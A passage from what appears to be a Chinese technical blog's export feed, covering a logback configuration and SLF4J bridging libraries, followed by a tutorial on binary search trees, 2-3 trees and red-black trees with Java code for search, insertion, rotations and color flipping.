class="name">fileNamePattern</span>&gt;</span>debug-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- or whenever the file size reaches 100MB --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"debug"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"STDOUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ERROR-OUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"INFO-OUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"DEBUG-OUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"SUM-OUT"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="日志系统转换"><a class="markdownIt-Anchor" href="#日志系统转换"></a> 日志系统转换</h1><h2 id="从日志框架转向slf4j"><a class="markdownIt-Anchor" href="#从日志框架转向slf4j"></a> 从日志框架转向slf4j</h2><ul><li>jul-to-slf4j：jdk-logging到slf4j的桥梁</li><li>log4j-over-slf4j：log4j1到slf4j的桥梁</li><li>jcl-over-slf4j：commons-logging到slf4j的桥梁</li></ul><h2 id="从slf4j转向具体的日志框架"><a class="markdownIt-Anchor" href="#从slf4j转向具体的日志框架"></a> 从slf4J转向具体的日志框架</h2><ul><li>slf4j-jdk14：slf4j到jdk-logging的桥梁</li><li>slf4j-log4j12：slf4j到log4j1的桥梁</li><li>log4j-slf4j-impl：slf4j到log4j2的桥梁</li><li>logback-classic：slf4j到logback的桥梁</li><li>slf4j-jcl：slf4j到commons-logging的桥梁</li></ul><h2 id="日志框架技术一览"><a class="markdownIt-Anchor" href="#日志框架技术一览"></a> 日志框架技术一览</h2><ul><li><p>JUL：JDK中的日志记录工具，也常称为JDKLog、jdk-logging。</p></li><li><p>LOG4J1：一个具体的日志实现框架。</p></li><li><p>LOG4J2：一个具体的日志实现框架，是LOG4J1的下一个版本。</p></li><li><p>LOGBACK：一个具体的日志实现框架，但其性能更好。</p></li><li><p>JCL：一个日志门面，提供统一的日志记录接口，也常称为commons-logging。</p></li><li><p>SLF4J：一个日志门面，与JCL一样提供统一的日志记录接口，可以方便地切换看具体的实现框架。</p><p>JUL、LOG4J1、LOG4J2、LOGBACK是<strong>日志实现框架</strong>，而JCL、SLF4J是<strong>日志实现门面</strong></p></li></ul><h1 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h1><ul><li>一般建议日志对象logger声明为private static final。声明为private可防止logger对象被其它类非法使用。声明为static可防止重复new出logger对象，造成资源浪费；还可防止logger被序列化，造成安全风险。声明为final是因为在类的声明周期内无需变更logger</li><li>如果日志不分级别或级别设置不合理，则定位问题时就无法快速有效地屏蔽大量低级别信息，给快速定位问题带来难度。<strong>建议与具体实现的日志使用debug级别，一般的业务处理日志使用info级别，不影响业务进行的错误使用warn级别，而记录异常或重要错误的日志应为error级别</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红黑树深入剖析及Java实现</title>
      <link href="/RBTree/"/>
      <url>/RBTree/</url>
      
        <content type="html"><![CDATA[<h2 id="bst"><a class="markdownIt-Anchor" href="#bst"></a> BST</h2><p>二叉查找树（Binary Search Tree，简称BST）是一颗二叉树，它的左子节点的值比父节点的值要小，右节点的值要比父节点的值大。它的高度决定了它的查找效率。</p><p>在理想情况下，二叉查找树增删改查的时间复杂度为o(logN)（其中N为节点数），最坏的情况下为o(N)。当它的高度为log(N) + 1时，我们就说二叉查找树是平衡的。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-e64df5b2126506c59bad4604d298d818_hd.png" alt="" /></p><h3 id="bst的查找操作"><a class="markdownIt-Anchor" href="#bst的查找操作"></a> BST的查找操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// T key = a search key</span></span><br><span class="line"><span class="comment">// Node root = point to the root of a BST</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (root.value.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.compareTo(root.value) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    root = root.left;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    root = root.right;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>从程序中可以看出，当BST查找的时候，先与当前节点进行比较：</p><ul><li>如果相等的话就返回当前节点</li><li>如果小于当前节点则继续查找当前节点的左节点</li><li>如果大于当前节点则继续查找当前节点的右节点</li></ul><p>直到当前节点指针为空或者查找到对应的节点，程序查找结束</p><h3 id="bst的插入操作"><a class="markdownIt-Anchor" href="#bst的插入操作"></a> BST的插入操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Node node = create a new node with specify value</span></span><br><span class="line"><span class="comment">// Node root = point the root node of a BST</span></span><br><span class="line"><span class="comment">// Node parent = null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// find the parent node to append the new node</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  parent = root;</span><br><span class="line">  <span class="keyword">if</span> (node.value.compareTo(root.value) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    root = root.left;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    root = root.right;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node.value.compareTo(parent.value) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    parent.left = node;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    parent.right = node;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入操作先通过循环查找到待插入的节点的父节点，和查找父节点的逻辑一样，都是比大小，小的往左，大的往右。找到父节点后，对比父节点，小的就插入到父节点的左节点，大就插入到父节点的右节点上</p><h3 id="bst的删除操作"><a class="markdownIt-Anchor" href="#bst的删除操作"></a> BST的删除操作</h3><p>删除操作的步骤如下：</p><ul><li>查找到要删除的节点</li><li>如果待删除的节点是叶子节点，则直接删除</li><li>如果待删除的节点不是叶子节点，则先找到待删除的节点的中序遍历的后继节点，用该后继节点的值替换待删除的节点的值，然后删除后续节点</li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-caf8927ad71613b1f93393931029b5a4_hd.png" alt="" /></p><h3 id="bst存在的问题"><a class="markdownIt-Anchor" href="#bst存在的问题"></a> BST存在的问题</h3><p>BST存在的主要问题是，在插入的时候会导致树倾斜，不同的插入顺序会导致树的高度不一样，而树的高度直接地影响了树的查找效率。理想的高度是logN，最坏的情况是所有的节点都在一条斜线上，这样的树的高度是N</p><h2 id="rbtree"><a class="markdownIt-Anchor" href="#rbtree"></a> RBTree</h2><p>基于BST存在的问题，一种新的树——平衡二叉查找树(Balanced BST)产生了。平衡树在插入和删除的时候，会通过旋转操作将高度保持在logN。其中两款具有代表性的平衡树分别为AVL树和红黑树。AVL树由于实现比较复杂，而且插入和删除性能差，在实际环境下的应用不如红黑树。</p><p>红黑树（Red-Black Tree，以下简称RBTree）的实际应用非常广泛，比如Linux内核中的完全公平调度器、高精度计时器、ext3文件系统等等，各种语言的函数库如Java的TreeMap和TreeSet，C++ STL的map、multimap、multiset等。</p><p>RBTree也是函数式语言中最常用的持久数据结构之一，在计算几何中也有重要作用。值得一提的是，Java 8中HashMap的实现也因为用RBTree取代链表，性能有所提升。</p><h3 id="avl树"><a class="markdownIt-Anchor" href="#avl树"></a> AVL树</h3><ul><li><p>简介：AVL树是带有平衡条件的二叉查找树，一般使用平衡因子差值判断是否平衡，平衡因子为左右子树高度之差，绝对值不能大于1，失衡时通过旋转来实现平衡，与红黑树相比，AVL树是严格的平衡二叉树，旋转是十分耗时的，因此AVL树适合用于插入删除次数较少，但查找较多的情况（中序遍历为有序序列，时间复杂度为o(n*logn)）</p></li><li><p>局限性：由于维护了这种高度平衡所付出的代价比从中获得的效益收益还大，故而实际的应用不多，更多的地方是用追求局部而不是非常严格整体平衡的红黑树。当然，如果应用场景中对插入删除不频繁，只是对查找要求较高，那么AVL还是较优于红黑树</p></li><li><p>应用：Windows NT内核中广泛存在</p></li></ul><h3 id="2-3树"><a class="markdownIt-Anchor" href="#2-3树"></a> 2-3树</h3><p>2-3树是一种绝对平衡树。它的节点元素个数可以为1个或者2个。如图，下面就是一个2-3树：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/21.png" alt="" /></p><p>2-3树中的2代表一个节点有两个孩子，3代表一个节点有三个孩子</p><h4 id="2-3树的操作"><a class="markdownIt-Anchor" href="#2-3树的操作"></a> 2-3树的操作</h4><h5 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h5><p>这里结合一个例子来查看2-3树是如何实现绝对平衡的。例如，现在我们要依次增加1、2、3、4、5、6、7这7个元素，如图</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-12-10%20%E4%B8%8B%E5%8D%884.44.58.png" alt="" /></p><p>如果所示，下面一个步骤一个步骤分析：</p><ul><li>插入1，判断无根节点，直接将1封装为节点并设置为根节点</li><li>插入2，这是因为1节点没有孩子节点并且只有1节点，所有直接将2加入到节点1中</li><li>插入3，和2节点一样，将3节点放入到根节点中，这是根节点有3个元素了，就需要变化为步骤4的样子。可以理解为将1、2、3的中间元素提取到根节点，也就是将2提出来，1作为左孩子，3作为右孩子</li><li>插入4，4比2大，增加到节点3</li><li>插入5，5比2大，增加到节点3、4中，这是节点3、4变为节点3、4、5，节点3、4、5按照第三步中将中间元素提取为双亲节点，而4提取出来的4回去找双亲节点2，2节点只有一个元素，所以4加入到2节点中</li><li>插入6，6大于根节点的2和4，进入最右边，5没有孩子只有一个元素，加入6到5节点</li><li>插入7，这时5、6、7将6提取出放入6的双亲节点，6的双亲节点（根节点）变为2、4、6。2、4、6提取出4变成最后的样子</li></ul><p>总的来说，插入方法和二分搜索相似。但是每个节点可以有1-2个元素，当节点元素个数为3时，就会分成3个节点并向上合并，直到合并完成。</p><h5 id="查找"><a class="markdownIt-Anchor" href="#查找"></a> 查找</h5><p>2-3树的查找和二分搜索树类似，不过因为一个节点可能有2个元素，需要对这两个元素进行比较，分别前往这两个节点的左、中、右孩子继续比较</p><h5 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h5><p>2-3树的删除稍微复杂一点儿，删除可分为两大情况，就是删除叶子节点和非叶子节点</p><p>这里只说理论情况，不结合代码实现，实际上代码实现会变得复杂也只是因为考虑的东西更多，代码实现会变得复杂</p><p><strong>删除叶子节点（不太懂）</strong></p><ul><li>当前节点是3节点，直接删除</li><li>当前节点是2节点：删除并判断<ul><li>双亲是2节点，判断兄弟节点<ul><li>兄弟节点是3节点，将兄弟节点移到双亲节点，再将双亲节点的另一个元素移到当前节点</li><li>兄弟节点是2节点，先通过移动兄弟节点的中序遍历直接后驱到兄弟节点，以使兄弟节点变为3节点，再进行删除</li></ul></li><li>双亲节点是3节点，拆分双亲节点使其变成2节点，再将双亲节点中最接近的一个拆分key与中孩子合并，将合并后的节点作为当前节点</li></ul></li><li>若2-3树是棵满二叉树，删除节点，将2-3树层树减少，并将兄弟节点合并到双亲节点中，同时将双亲节点的所有兄弟节点合并到双亲节点的双亲节点中，如果变为4节点，就做分解操作</li></ul><p><strong>删除非叶子节点</strong></p><p>使用中序遍历下的直接后继节点key来覆盖当前节点key，再删除用来覆盖的后继节点key</p><h3 id="rbtree定义"><a class="markdownIt-Anchor" href="#rbtree定义"></a> RBTree定义</h3><p>在开始红黑树之前，我们要知道红黑树并非只有2-3树这一种实现方式，虽然2-3树实现红黑树比较方便。RBTree的定义如下：</p><ul><li>任何一个节点都有颜色，黑色或者红色</li><li>根节点是黑色的</li><li>父子节点之间不能出现两个连续的红色节点</li><li>任何一个节点向下遍历到其子孙节点的叶子节点，所经过的黑色节点个数必须相等</li><li>空节点被认为是黑色的，即每一个叶子节点是黑色</li></ul><p>2-3树与红黑树的关系</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-12-10%20%E4%B8%8B%E5%8D%888.40.54.png" alt="" /></p><p>如图，我们可以看到，可以将2-3树中的3节点中的左元素弄成一个新节点，这个节点就是红黑树中的红节点，并且将红节点统一进行左偏向，得出右图的红黑树，这样的红黑树也叫左倾红黑树。</p><p>数据结构表示如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 排序也是通过key进行排序</span></span><br><span class="line">  <span class="keyword">public</span> K key;</span><br><span class="line">  <span class="keyword">public</span> V value;</span><br><span class="line">  <span class="keyword">public</span> Node left, right;</span><br><span class="line">  <span class="comment">// 红为true，黑为false，默认节点为红</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">boolean</span> color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RBTree在理论上还是一颗BST树，但是它在对BST的插入和删除操作时会维持树的平衡，即保证树的高度在[logN, logN + 1]（理论上，极端情况下可以出现RBTree的高度达到2*logN，但实际上很难遇到）。这样RBTree的查找时间复杂度始终保持在o(logN)从而接近于理想的BST。RBTree的删除和插入操作的时间复杂度也是o(logN)。RBTree的查找操作就是BST的查找操作</p><h4 id="rbtree的旋转操作"><a class="markdownIt-Anchor" href="#rbtree的旋转操作"></a> RBTree的旋转操作</h4><p>旋转操作（Rotate）的目的是使节点的颜色符合定义，让RBTree的高度达到平衡。</p><p>Rotate分为left-rotate（左旋）和right-notate（右旋），区分左旋和右旋的方法是：<strong>待旋转的节点从左边上升到父节点就是右旋，待旋转节点从右边上升到父节点就是左旋。</strong></p><p><strong>左旋转</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//   node                     x</span></span><br><span class="line"><span class="comment">//  /   \     左旋转         /  \</span></span><br><span class="line"><span class="comment">// T1   x   ---------&gt;   node   T3</span></span><br><span class="line"><span class="comment">//     / \              /   \</span></span><br><span class="line"><span class="comment">//    T2 T3            T1   T2</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Node <span class="title">leftRotate</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">  Node x = node.right;</span><br><span class="line">  <span class="comment">// 左旋转</span></span><br><span class="line">  node.right = x.left;</span><br><span class="line">  x.left = node;</span><br><span class="line">  x.color = node.color;</span><br><span class="line">  node.color = RED;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>右旋转</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//     node                   x</span></span><br><span class="line"><span class="comment">//    /   \     右旋转       /  \</span></span><br><span class="line"><span class="comment">//   x    T2   -------&gt;   y   node</span></span><br><span class="line"><span class="comment">//  / \                       /  \</span></span><br><span class="line"><span class="comment">// y  T1                     T1  T2</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Node <span class="title">rightRotate</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">  Node x = node.left;</span><br><span class="line">  <span class="comment">// 右旋转</span></span><br><span class="line">  node.left = x.right;</span><br><span class="line">  x.right = node;</span><br><span class="line">  x.color = node.color;</span><br><span class="line">  node.color = RED;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>颜色翻转</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 颜色翻转</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flipColors</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">  node.color = RED;</span><br><span class="line">  node.left.color = BLACK;</span><br><span class="line">  node.right.color = BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>左旋和右旋总结</strong></p><p>树的旋转，能保持不变的只有树的二叉查找性质，而原树的红黑性质则不能保持，在红黑树的数据插入和删除后，可利用旋转和颜色翻转来恢复树的红黑性质</p><h4 id="rbtree的查找操作"><a class="markdownIt-Anchor" href="#rbtree的查找操作"></a> RBTree的查找操作</h4><p>RBTree的查找操作和BST的查找操作是一样的。请参考BST的查找操作代码。</p><h4 id="btree的插入操作介绍一"><a class="markdownIt-Anchor" href="#btree的插入操作介绍一"></a> BTree的插入操作介绍一</h4><p>向一颗含有n个节点的红黑树插入一个新的节点的操作可以在o(logn)时间完成</p><p>在插入操作分析之前，再复习下红黑树的性质：</p><blockquote><p>1、每个节点要么是红色，要么是黑色<br />2、根节点是黑色<br />3、所有叶子节点是黑色，即空节点（NIL）<br />4、如果一个节点是红色的，则它的两个子节点必须是黑色的，也就是父子节点不能都为红色<br />5、从一个节点到其所有叶子节点的所有路径上包含相同数目的黑节点</p></blockquote><p><strong>规则预定</strong></p><ol><li>在红黑树中插入节点，节点的初始颜色都是红色，因为这样可以在插入过程中尽量避免对树的结构进行调整（参考第5点性质）</li><li>初始插入按照二叉查找树的性质插入，即找到合适大小的节点，在其左边或者右边插入子节点</li></ol><p>我们在插入一个节点后，会使树的那些性质改变呢？</p><ol><li>由于是以二叉查找树的性质插入，因此节点的查找性质不会被破坏</li><li>如果插入空树中，成为根节点，则性质2会被破坏，需要重新涂色</li><li>如果插入节点的父节点是红色，则性质4会被破坏，需要以插入的当前节点为中心进行旋转或重新涂色来恢复红黑树的性质。<strong>执行旋转或重新涂色后有可能红黑树仍然不满足性质，则需要将当前节点变换回溯到其父节点或祖父节点，以父节点或祖父节点为中心继续旋转或重新涂色，如此循环到根节点直到满足红黑树的性质。</strong></li></ol><p><strong>恢复红黑树性质的策略</strong></p><p>根据上面说到的性质改变，对应的恢复策略其实就简单很多</p><ol><li><p>把出现违背红黑树性质的结点向上移（通过旋转操作或变换当前节点到父节点或祖父节点后再旋转达到向上移动的目的），如果能移到根结点，那么很容易就能通过直接修改根结点的颜色，或旋转根节点来恢复红黑树的性质</p></li><li><p>旋转或涂色处理可分5种情况进行处理</p><blockquote><p>情况1：空树中插入根节点<br />情况2：插入节点的父节点是黑色<br />情况3：当前节点的父节点是红色，且叔叔节点（祖父节点的另一个子节点）也是红色<br />情况4：当前节点的父节点是红色，叔叔节点是黑色，当前节点是右子节点<br />情况5：当前节点的父节点是红色，叔叔节点是黑色，当前节点是左子节点</p></blockquote></li></ol><p><strong>情况1：空树中插入根节点</strong><br />违反：性质2<br />恢复策略：初始插入的节点均为红色，因此简单将红色重涂为黑色即可。</p><p><strong>情况2：插入节点的父节点是黑色</strong><br />违反：插入的红色节点，未违反任何性质。<br />恢复策略：什么也不做，无需调整。</p><p><strong>情况3：当前节点的父节点是红色，且叔叔节点也是红色</strong><br />违反：性质4<br />此时祖父节点一定存在，否则插入前就已不是红黑树。<br />与此同时，又分为父节点是祖父节点的左子还是右子，由于对称性，我们只要解开一个方向就可以了。在此，我们只考虑父节点为祖父左子的情况。<br />同时，还可以分为当前结点是其父结点的左子还是右子，但是处理方式是一样的。我们将此归为同一类。<br />恢复策略：将当前节点的父节点和叔叔节点涂黑，祖父结点涂红，把当前结点指向祖父节点，以祖父节点为中心重新开始新一轮的旋转或涂色。<br />以插入节点4为例，按照恢复策略，做如下图的涂色：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-12-10%20%E4%B8%8B%E5%8D%8810.23.41.png" alt="" /></p><p>以插入节点4为当前节点，判断父节点和叔叔节点是否都为红色，如果为红色，则将祖父节点7的颜色改为红色，父节点5和叔叔节点8的颜色改为黑色。同时当前节点移动到祖父节点7。此时，当前节点7的父节点也为红色，出现父子节点都为红色的情况，且叔叔节点为黑色，因此适用于<strong>情况4：当前节点的父节点是红色，叔叔节点是黑色，当前节点是右子节点</strong>，那么按照<strong>情况4</strong>的恢复策略，进行新一轮的旋转或涂色，如下看<strong>情况4</strong>如何进行调整。</p><p><strong>情况4：当前节点的父节点是红色，叔叔节点是黑色，当前节点是右子节点</strong><br />违反：性质4<br />恢复策略：以当前节点的父节点作为新的当前节点，以新的当前节点为支撑，进行左旋操作。旋转操作后再按新的情况进行旋转或涂色。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-12-10%20%E4%B8%8B%E5%8D%8810.25.21.png" alt="" /></p><p>这里作的操作为：当前节点由原来的7变换为其父节点2，以新的当前节点2，作左旋操作，如上图。操作完成后，发现父子节点仍都是红色，继续进行旋转或涂色。这里适用于<strong>情况5：当前节点的父节点是红色，叔叔节点是黑色，当前节点是左子节点</strong>来进行再次调整，请看下面的<strong>情况5</strong>如何进行调整。</p><p><strong>情况5：当前节点的父节点是红色，叔叔节点是黑色，当前节点是左子节点</strong><br />违反：性质4<br />恢复策略：父节点改变为黑色，祖父节点改变为红色，然后再以祖父节点为新的当前节点，做右旋操作。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-12-10%20%E4%B8%8B%E5%8D%8810.26.51.png" alt="" /></p><p>此时，树已经满足红黑树的性质，如果仍不满足，则仍按照情况1——情况5的方式进行旋转和重新涂色。</p><h4 id="rbtree的插入操作介绍二"><a class="markdownIt-Anchor" href="#rbtree的插入操作介绍二"></a> RBTree的插入操作介绍二</h4><p>RBTree的插入与BST的插入方式是一致的，只不过是在插入过后，可能会导致树的不平衡，这是就需要对树进行旋转操作的颜色修复（这里简称插入修复），使得它符合RBTree的定义。</p><p>新插入的节点是红色的，插入修复操作如果遇到父节点的颜色为黑则修复结束。也就是说，只有在父节点为红色节点的时候是需要插入修复操作的。</p><p>插入修复操作分为以下三种情况，而且新插入的节点的父节点都是红色的：</p><ul><li>叔叔节点也是红色</li><li>叔叔节点为空，且祖父节点、父节点和新节点处于一条斜线上</li><li>叔叔节点为空，且祖父节点、父节点和新节点不处于一条斜线上</li></ul><h5 id="插入操作case1"><a class="markdownIt-Anchor" href="#插入操作case1"></a> 插入操作——case1</h5><p>case1的操作是将父节点和叔叔节点与祖父节点的颜色互换，这样就符合了RBTree的定义。即维持了高度的平衡，修复后颜色也符合RBTree的定义的第三条和第四条。下图中，操作完成后A节点变成了新节点，如果A节点的父节点不是黑色的话，则继续做修复操作</p><p><img src="https://pic1.zhimg.com/80/v2-85d7be8e54ae9f904d86bf5f5ee3b4bc_hd.png" alt="" /></p><h5 id="插入操作case2"><a class="markdownIt-Anchor" href="#插入操作case2"></a> 插入操作——case2</h5><p>case2的操作是将B节点进行右旋操作，并且和父节点A互换颜色。通过该修复操作RBTree的高度和颜色都符合红黑树的定义。如果B和C节点都是右节点的话，只要将操作变成左旋就可以</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-cd2171937e0ed68bca55214357e6669e_hd.png" alt="" /></p><h5 id="插入操作case3"><a class="markdownIt-Anchor" href="#插入操作case3"></a> 插入操作——case3</h5><p>case3的操作是将C节点进行左旋，这样就从case3转换成case2，然后针对case 2进行操作处理就行了。case 2操作做了一个右旋操作和颜色互换来达到目的。如果树的结构是下图的镜像结构，则只需要将对应的左旋变成右旋，右旋变成左旋即可。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-8594087429e54acbbc2aa6ae9da8cc5f_hd.png" alt="" /></p><h5 id="插入操作的总结"><a class="markdownIt-Anchor" href="#插入操作的总结"></a> 插入操作的总结</h5><p>插入后的修复操作是一个从root节点回溯的操作，一旦牵扯的节点都符合了红黑树的定义，修复操作结束。之所以会向上回溯是由于case1操作会将父节点、叔叔节点和祖父节点进行颜色互换，有可能会导致祖父节点不平衡（红黑树定义3）。这个时候需要对祖父节点为起点进行调节（向上回溯）</p><p>祖父节点调节后如果还是遇到它的祖父节点颜色问题，操作就会继续向上回溯，直到root节点为止，根据定义root节点永远是黑色的。在向上的追溯的过程中，针对插入的情况3中情况进行调节。直到符合红黑树定义为止。知道牵扯的节点都符合了红黑树的定义，修复操作结束。</p><p>如果上面的3中情况如果对应的操作是在右子树上，做对应的镜像操作就是了。</p><h4 id="rbtree的删除操作"><a class="markdownIt-Anchor" href="#rbtree的删除操作"></a> 